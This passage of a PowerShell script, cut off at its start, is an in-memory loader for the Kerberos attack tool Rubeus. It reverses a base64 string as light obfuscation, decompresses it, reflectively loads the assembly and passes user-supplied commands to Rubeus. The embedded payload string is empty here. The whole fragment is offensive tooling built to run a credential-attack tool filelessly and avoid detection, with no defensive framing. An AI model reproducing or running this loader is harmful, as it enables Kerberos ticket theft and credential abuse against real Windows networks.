    }

    
    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $kipak64 = '' 

    $Maafkeun = ([regex]::Matches($kipak64,'.','RightToLeft') | ForEach {$_.value}) -join ''
    $kipakData = [Convert]::FromBase64String($Maafkeun)
    $memoryStream = New-Object System.IO.MemoryStream
    $memoryStream.Write($kipakData, 0, $kipakData.Length)
    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin) > $null

    $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
    $decompressedMemoryStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($decompressedMemoryStream)
    $decompressedData = $decompressedMemoryStream.ToArray()


    $asw = [System.Reflection.Assembly]::Load($decompressedData)

    [Rubeus.Program]::Main("$Kommandtz".Split())

